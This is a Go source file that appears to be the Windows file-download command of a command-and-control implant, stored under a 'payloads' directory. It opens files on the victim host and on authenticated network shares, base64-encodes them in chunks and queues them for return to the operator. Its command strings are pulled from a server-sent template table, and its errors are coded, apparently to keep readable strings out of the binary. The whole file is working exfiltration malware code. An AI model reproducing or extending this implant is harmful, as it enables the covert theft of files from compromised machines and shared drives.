// server/docker/payloads/Windows/action_download.go
//go:build windows
// +build windows

package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"time"
)

// DownloadTemplate matches the server's CommandTemplate structure
type DownloadTemplate struct {
	Version   int      `json:"v"`
	Type      int      `json:"t"`
	Templates []string `json:"tpl"`
	Params    []string `json:"p"`
}

// Template indices - must match server's common.go
const (
	idxDlCmdName   = 570
	idxDlOSWindows = 571
	idxDlCmdPrefix = 572
	idxDlChunkFmt  = 573
	idxDlPipeSep   = 574
	idxDlSlash     = 575
	idxDlAsPrefix  = 576
	idxDlBackslash = 577
	idxDlNewline   = 578
)

// Global download template storage
var (
	downloadTemplate   []string
	downloadTemplateMu sync.RWMutex
)

// SetDownloadTemplate stores the download template for use across files
func SetDownloadTemplate(templates []string) {
	downloadTemplateMu.Lock()
	downloadTemplate = templates
	downloadTemplateMu.Unlock()
}

// dlTpl retrieves a download template string by index
func dlTpl(idx int) string {
	downloadTemplateMu.RLock()
	defer downloadTemplateMu.RUnlock()
	if downloadTemplate != nil && idx < len(downloadTemplate) {
		return downloadTemplate[idx]
	}
	return ""
}

// Convenience functions for download template values
func dlCmdName() string   { return dlTpl(idxDlCmdName) }
func dlOSWindows() string { return dlTpl(idxDlOSWindows) }
func dlCmdPrefix() string { return dlTpl(idxDlCmdPrefix) }
func dlChunkFmt() string  { return dlTpl(idxDlChunkFmt) }
func dlPipeSep() string   { return dlTpl(idxDlPipeSep) }
func dlSlash() string     { return dlTpl(idxDlSlash) }
func dlAsPrefix() string  { return dlTpl(idxDlAsPrefix) }
func dlBackslash() string { return dlTpl(idxDlBackslash) }
func dlNewline() string   { return dlTpl(idxDlNewline) }

// Buffer pool for download chunks to reduce allocations
var downloadBufferPool = sync.Pool{
	New: func() interface{} {
		buf := make([]byte, 512*1024) // 512KB chunks
		return &buf
	},
}

type DownloadCommand struct {
	tpl *DownloadTemplate
}

// Modified Execute function from action_download.go
func (c *DownloadCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	// Parse template from Command.Data if available
	if ctx.CurrentCommand != nil && ctx.CurrentCommand.Data != "" {
		if decoded, err := base64.StdEncoding.DecodeString(ctx.CurrentCommand.Data); err == nil {
			c.tpl = &DownloadTemplate{}
			if err := json.Unmarshal(decoded, c.tpl); err == nil && c.tpl.Templates != nil {
				SetDownloadTemplate(c.tpl.Templates)
			}
		}
	}

	// With the improved parsing, we should receive exactly one argument (the full path)
	// But let's still handle the case where it might have been split
	if len(args) == 0 {
		return CommandResult{
			Error:       fmt.Errorf(Err(E1)),
			ErrorString: Err(E1),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Join all args back together in case they were incorrectly split
	// With the new parsing, this should usually just be args[0]
	targetPath := strings.Join(args, " ")

	// Remove any surrounding quotes if present (should already be done by parser)
	targetPath = strings.Trim(targetPath, "\"'")

	// Handle path resolution for both local and UNC paths
	if !filepath.IsAbs(targetPath) {
		// Get the current working directory
		workingDir := ctx.WorkingDir

		// Special handling for UNC paths
		if strings.HasPrefix(workingDir, "\\\\") || strings.HasPrefix(workingDir, "//") {
			// For UNC paths, normalize to backslashes
			workingDir = strings.ReplaceAll(workingDir, "/", "\\")

			// Ensure proper path joining for UNC
			if !strings.HasSuffix(workingDir, "\\") {
				workingDir += "\\"
			}
			targetPath = workingDir + targetPath
		} else {
			// For local paths, use filepath.Join
			targetPath = filepath.Join(workingDir, targetPath)
		}
	}

	// Clean the path but preserve UNC format
	if strings.HasPrefix(targetPath, "\\\\") || strings.HasPrefix(targetPath, "//") {
		// Normalize to backslashes for UNC
		targetPath = strings.ReplaceAll(targetPath, "/", "\\")

		// Manual cleaning for UNC paths to preserve the double backslash
		parts := strings.Split(targetPath, "\\")
		var cleanParts []string
		for _, part := range parts {
			if part != "" && part != "." {
				cleanParts = append(cleanParts, part)
			}
		}
		// Reconstruct with double backslash prefix for UNC
		if len(cleanParts) > 2 {
			targetPath = "\\\\" + strings.Join(cleanParts, "\\")
		}
	} else {
		// For non-UNC paths, use standard cleaning
		targetPath = filepath.Clean(targetPath)
	}

	// Display path for user feedback
	displayPath := targetPath
	if runtime.GOOS == dlOSWindows() {
		displayPath = strings.ReplaceAll(targetPath, "/", "\\")
	}

	// Use NetworkAwareOpenFile to support network shares
	// This handles network authentication properly
	file, err := NetworkAwareOpenFile(targetPath, os.O_RDONLY, 0)

	if err != nil {
		return CommandResult{
			Output:      ErrCtx(E10, displayPath),
			Error:       err,
			ErrorString: Err(E10),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}
	defer file.Close()

	// Get file information
	fileInfo, err := file.Stat()
	if err != nil {
		return CommandResult{
			Output:      ErrCtx(E10, displayPath),
			Error:       err,
			ErrorString: Err(E10),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Check if it's a directory
	if fileInfo.IsDir() {
		return CommandResult{
			Output:      ErrCtx(E6, displayPath),
			Error:       fmt.Errorf(Err(E6)),
			ErrorString: Err(E6),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Generate context info (compact format: path|size|modtime)
	contextInfo := fmt.Sprintf("%s|%d|%s",
		displayPath,
		fileInfo.Size(),
		fileInfo.ModTime().Format("2006-01-02 15:04:05"))

	// Read first chunk using buffer pool
	const chunkSize = 512 * 1024 // 512KB chunks
	bufPtr := downloadBufferPool.Get().(*[]byte)
	defer downloadBufferPool.Put(bufPtr)
	chunk := *bufPtr
	n, err := file.Read(chunk)
	if err != nil && err != io.EOF {
		return CommandResult{
			Output:      ErrCtx(E10, displayPath),
			Error:       err,
			ErrorString: Err(E10),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// For tracking purposes, use the base filename
	baseFilename := filepath.Base(targetPath)
	trackedFilename := baseFilename

	// Special case: single small file
	if n < chunkSize && err == io.EOF {
		encodedData := base64.StdEncoding.EncodeToString(chunk[:n])
		return CommandResult{
			Output:      contextInfo + "\n" + SuccCtx(S5, baseFilename),
			ExitCode:    0,
			CompletedAt: time.Now().Format(time.RFC3339),
			Command: Command{
				Command:      dlCmdPrefix() + baseFilename,
				Filename:     trackedFilename,
				CurrentChunk: 1,
				TotalChunks:  1,
				Data:         encodedData,
			},
		}
	}

	// Calculate total chunks properly
	totalChunks := (fileInfo.Size() + chunkSize - 1) / chunkSize
	if totalChunks == 0 {
		totalChunks = 1
	}

	encodedData := base64.StdEncoding.EncodeToString(chunk[:n])

	// Register the new download with the command queue
	commandQueue.AddOrUpdateDownload(trackedFilename, targetPath, int(totalChunks))
	commandQueue.UpdateDownloadProgress(trackedFilename, 1)

	result := CommandResult{
		Output:      contextInfo + dlChunkFmt() + baseFilename + dlPipeSep() + "1" + dlSlash() + fmt.Sprintf("%d", totalChunks),
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
		Command: Command{
			Command:      dlCmdPrefix() + baseFilename,
			Filename:     trackedFilename,
			CurrentChunk: 1,
			TotalChunks:  int(totalChunks),
			Data:         encodedData,
		},
	}

	return result
}

// Note: NetworkAwareOpenFile is already defined in netonly_file_support.go for Windows
// and has a stub implementation in network_aware_stub.go for non-Windows systems.
// It handles network authentication automatically when accessing network shares.

// GetNextFileChunk continues downloading a file from a specific chunk
func GetNextFileChunk(filePath string, chunkNumber int, originalCmd Command) (*CommandResult, error) {
	// Use NetworkAwareOpenFile for network authentication support
	file, err := NetworkAwareOpenFile(filePath, os.O_RDONLY, 0)

	if err != nil {
		return nil, fmt.Errorf(Err(E10))
	}
	defer file.Close()

	// Get file information
	_, err = file.Stat()
	if err != nil {
		return nil, fmt.Errorf(Err(E10))
	}

	const chunkSize = 512 * 1024 // 512KB chunks

	// Seek to the correct position
	offset := int64(chunkNumber-1) * chunkSize
	_, err = file.Seek(offset, 0)
	if err != nil {
		return nil, fmt.Errorf(Err(E10))
	}

	// Read the chunk using buffer pool
	bufPtr := downloadBufferPool.Get().(*[]byte)
	defer downloadBufferPool.Put(bufPtr)
	chunk := *bufPtr
	n, err := file.Read(chunk)
	if err != nil && err != io.EOF {
		return nil, fmt.Errorf(Err(E10))
	}

	if n == 0 {
		return nil, fmt.Errorf(ErrCtx(E24, fmt.Sprintf("%d", chunkNumber)))
	}

	// Encode the chunk
	encodedData := base64.StdEncoding.EncodeToString(chunk[:n])

	// Create the result (compact format: chunk/total|filename)
	result := &CommandResult{
		Output:      fmt.Sprintf("C%d/%d|%s", chunkNumber, originalCmd.TotalChunks, filepath.Base(filePath)),
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
		Command: Command{
			CommandID:    originalCmd.CommandID,
			CommandDBID:  originalCmd.CommandDBID,
			AgentID:      originalCmd.AgentID,
			Command:      originalCmd.Command,
			Filename:     originalCmd.Filename,
			CurrentChunk: chunkNumber,
			TotalChunks:  originalCmd.TotalChunks,
			Data:         encodedData,
			Timestamp:    originalCmd.Timestamp,
		},
	}

	return result, nil
}
